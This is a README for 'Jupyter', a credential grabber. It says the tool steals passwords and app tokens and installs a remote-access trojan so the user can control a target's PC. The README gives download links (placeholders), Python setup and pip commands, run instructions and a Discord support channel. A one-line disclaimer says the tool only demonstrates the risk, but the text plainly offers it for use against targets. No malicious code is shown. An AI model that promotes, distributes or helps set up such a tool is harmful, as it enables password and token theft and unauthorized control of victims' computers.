# 🪐・Jupyter
Jupyter is a grabber that steal passwords, and app tokens. It install a RAT and you can control the PC of your target.
Jupyter is not created for hack people but just for show to everyone that just a executable file can reveal your real identity and can steal your informations.

- site: [jupyter.jupytergrabber.repl.co](https://jupyter.jupytergrabber.repl.co/)
- tools and frameworks: [Python](https://www.python.org/), [Flask](https://flask.palletsprojects.com/en/2.1.x/), [Nuitka](https://nuitka.net/), [Pillow](https://pypi.org/project/Pillow/)
- authors: [BlueRed](https://github.com/CSM-BlueRed), [Lactua](https://github.com/Drayxio)
- source-code: [github.com/Jupyter-project/Jupyter]()

## Download

- ### releases
  - ### executables
    - ### 64 bits
      - name: (link)[https://link]
    - ### 32 bits
      - name: (link)[https://link]
  - ### python source
    - name: (link)[https://link]
  - ### PYC file
    - name: (link)[https://link]
- ### pre-releases
  - ### executables
    - ### 64 bits
      - name: (link)[https://link]
    - ### 32 bits
      - name: (link)[https://link]
  - ### python source
    - name: (link)[https://link]
  - ### PYC file
    - name: (link)[https://link]

## setup Jupyter
Before using Jupyter, Jupyter need some requirements:
<br>
first, if you dont download an executable version, [install Python](https://www.python.org/downloads/) in the [Python website](https://www.python.org/)
<br>
When the Python setup window pop up, select two options: `add Python to environement variables` & `add PIP`, and click on the install button.
<br>
When Python is ready to be used, open a terminal, and run these commands:
```batch
py -m pip install pillow
py -m pip install cryptography
py -m pip install PyPanel
```
or just in 1 command:
```batch
py -m pip install pillow cryptography PyPanel
```
<br>
Finally, you are ready to use Jupyter.

## use Jupyter
To use Jupyter, install one of all releases or pre-releases, if the file is an executable, you have just to run it.
<br>
If the file is a python compiled code file or a python source code file (`.py`, `.pyc`), open a terminal in the Jupyter path (path where you download) and run this command:
```batch
py file_name
```
(replace `file_name` with the full file name (`name.extension`))
If an error is raised and you know how to solve it, please let us a pull request with you corrections, else, open a GitHub issue or join our [Discord server](discord.gg/VdAfVNkMff) and read the channel `🪐╎jupyter-help` (id: `#996125572033945610`)
